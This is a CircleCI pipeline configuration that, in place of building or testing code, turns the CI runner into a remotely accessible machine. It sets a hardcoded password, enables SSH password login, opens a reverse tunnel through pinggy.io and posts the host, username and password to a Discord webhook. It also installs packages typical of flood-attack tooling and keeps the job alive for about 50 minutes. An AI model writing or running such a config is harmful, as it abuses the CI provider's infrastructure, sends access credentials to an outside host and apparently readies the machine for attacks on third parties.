version: 2.1

jobs:
  pinggy-1:
    machine:
      image: ubuntu-2204:current
    steps:
      - checkout
      - run:
          name: FULL SETUP
          no_output_timeout: 60m
          command: |
            echo 'runner:Venom123!' | sudo chpasswd
            sudo sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
            sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/g' /etc/ssh/sshd_config
            echo 'PasswordAuthentication yes' | sudo tee /etc/ssh/sshd_config.d/60-password-auth.conf
            sudo systemctl restart ssh
            sudo apt update -y
            sudo apt install -y curl wget python3 python3-pip
            curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.0/install.sh | bash
            export NVM_DIR="$HOME/.nvm"
            [ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"
            nvm install 20.19.5
            nvm use 20.19.5
            npm install -g pm2
            npm init -y
            npm install gradient-string colors axios node-bash-title user-agents hpack socks randomstring sockopt
            pkill -f "tcp@a.pinggy.io" || true
            ssh -o StrictHostKeyChecking=no -p 443 -R0:localhost:22 tcp@a.pinggy.io > pinggy.log 2>&1 &
            sleep 15
            LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.-]+:[0-9]+' pinggy.log | head -n1)
            CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
            curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
            sleep 3000
